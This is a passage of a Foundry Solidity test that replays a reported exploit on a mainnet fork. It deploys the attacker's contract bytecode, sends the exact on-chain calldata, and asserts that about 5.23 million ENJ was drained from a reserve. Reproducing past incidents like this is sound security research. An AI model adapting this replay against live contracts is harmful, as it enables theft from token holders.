    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);
    }

    /// forge-config: default.evm_version = "cancun"
    function testExploit() public {
        assertEq(vm.getNonce(ATTACKER), 0, "attacker nonce must be 0 for CREATE to land at EXPLOIT addr");
        assertEq(ENJ.balanceOf(ATTACKER), 0, "attacker starts with 0 ENJ");
        uint256 reserveBefore = ENJ.balanceOf(RESERVE);

        vm.startPrank(ATTACKER, ATTACKER); // msg.sender == tx.origin == attacker, matching the real trace

        // nonce 0: deploy the exploit contract; CREATE address == 0x7083... (hardcoded in the calldata)
        bytes memory code = CREATION_CODE;
        address deployed;
        assembly {
            deployed := create(0, add(code, 0x20), mload(code))
        }
        require(deployed == EXPLOIT, "deploy address mismatch");

        // nonce 1: run the drain with the exact on-chain calldata
        (bool ok,) = deployed.call(EXPLOIT_CALLDATA);
        require(ok, "exploit call reverted");

        vm.stopPrank();

        uint256 gained = ENJ.balanceOf(ATTACKER);
        emit log_named_decimal_uint("Attacker ENJ gained", gained, 18);
        emit log_named_decimal_uint("Reserve ENJ drained", reserveBefore - ENJ.balanceOf(RESERVE), 18);

        // Reported ~5.24M ENJ; traced attacker net gain is 5,231,353 ENJ.
        assertApproxEqAbs(gained, 5_231_353 ether, 1_000 ether, "attacker ENJ gain off traced figure");
    }
